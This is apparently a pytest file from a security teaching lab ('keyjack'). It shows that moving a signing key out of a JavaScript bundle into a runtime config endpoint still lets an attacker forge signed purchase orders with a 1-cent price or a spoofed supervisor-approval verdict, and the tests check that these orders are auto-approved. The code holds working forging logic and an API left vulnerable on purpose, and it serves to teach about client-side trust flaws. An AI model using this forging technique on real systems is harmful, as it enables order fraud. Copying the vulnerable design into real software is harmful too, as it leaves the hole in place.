"""The half-fixed variant: plausible remediations applied, defeated anyway."""

from __future__ import annotations

import httpx
import pytest

from keyjack.attacker.cli import forge_client_verdict_order, forge_embedded_key_order
from keyjack.signing import DEMO_SIGNING_KEY, canonical_order_string, sign


def hlogin(client: httpx.Client) -> None:
    res = client.post(
        "/api/login", json={"account_id": "tech-avery", "password": "avery-ninebark-demo"}
    )
    assert res.status_code == 200


def test_key_is_removed_from_source_but_served_at_runtime(halffixed_api: httpx.Client) -> None:
    source = halffixed_api.get("/static/app/client.min.js").text
    assert DEMO_SIGNING_KEY not in source  # removed from the source file
    config = halffixed_api.get("/api/client-config").json()
    assert config.get("signing_key") == DEMO_SIGNING_KEY  # delivered at runtime instead


def test_half_fixed_app_does_not_serve_the_embedded_key_client(
    halffixed_api: httpx.Client,
) -> None:
    # The half-fixed app serves only its own client; the embedded-key source is not reachable.
    assert halffixed_api.get("/static/app/client.js").status_code == 404


def test_client_bundle_is_minified(halffixed_api: httpx.Client) -> None:
    source = halffixed_api.get("/static/app/client.min.js").text
    lines = source.splitlines()
    # Dense, no pretty-printing: a long line, and no 4-space-indented block formatting.
    assert max(len(line) for line in lines) > 200
    assert not any(line.startswith("    ") for line in lines)


def test_signing_key_attack_still_succeeds(halffixed_api: httpx.Client) -> None:
    hlogin(halffixed_api)
    order: dict[str, object] = {
        "part_number": "PN-7741", "quantity": 1, "work_order_id": "WO-1001",
        "unit_price_cents": 1, "restricted": False, "line_total_cents": 1,
    }
    sig = sign(DEMO_SIGNING_KEY, canonical_order_string(
        part_number="PN-7741", quantity=1, work_order_id="WO-1001",
        unit_price_cents=1, restricted=False, line_total_cents=1,
    ))
    res = halffixed_api.post(
        "/api/orders", json=order, headers={"X-Ninebark-Signature": sig}
    )
    assert res.json()["state"] == "auto_approved"


def test_verdict_attack_still_succeeds(halffixed_api: httpx.Client) -> None:
    hlogin(halffixed_api)
    order: dict[str, object] = {
        "part_number": "PN-7741", "quantity": 1, "work_order_id": "WO-1001",
        "unit_price_cents": 189_000, "restricted": True, "line_total_cents": 189_000,
        "within_limit": True, "requires_supervisor": False,
    }
    sig = sign(DEMO_SIGNING_KEY, canonical_order_string(
        part_number="PN-7741", quantity=1, work_order_id="WO-1001",
        unit_price_cents=189_000, restricted=True, line_total_cents=189_000,
        within_limit=True, requires_supervisor=False,
    ))
    res = halffixed_api.post(
        "/api/orders", json=order, headers={"X-Ninebark-Signature": sig}
    )
    assert res.json()["state"] == "auto_approved"


def test_cli_defeats_half_fixed_via_runtime_key(halffixed_base_url: str) -> None:
    result = forge_client_verdict_order(halffixed_base_url, from_config=True)
    assert result.extracted_value == DEMO_SIGNING_KEY
    assert result.extracted_source.endswith("/api/client-config")  # read over the wire
    assert result.order_state == "auto_approved"


def test_source_key_extraction_is_closed_on_half_fixed(halffixed_base_url: str) -> None:
    # The embedded-source route is closed (no key in a source file the half-fixed app serves);
    # only the runtime-key route lands, which is the whole lesson.
    with pytest.raises(RuntimeError):
        forge_embedded_key_order(halffixed_base_url)
